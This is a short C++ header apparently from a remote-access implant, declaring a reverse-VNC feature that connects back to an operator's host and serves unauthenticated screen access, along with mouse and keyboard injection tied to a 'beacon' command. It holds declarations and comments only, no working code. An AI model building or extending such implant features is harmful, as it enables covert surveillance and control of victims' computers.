#pragma once
#include <string>

// Reverse-VNC: implant dials host:port and serves RFB 3.3 (None auth).
// Operator watches/controls with any standard VNC viewer.
std::wstring HandleVnc(const std::string& args);
bool VncRunning();

// Input injection shared with the !input beacon command.
// Coordinates are normalized 0..10000 so the operator side never needs to
// know the target's actual resolution.
void VncInjectMouseNorm(int nx, int ny, int buttons);
void VncInjectKeyVk(int vk, bool down);

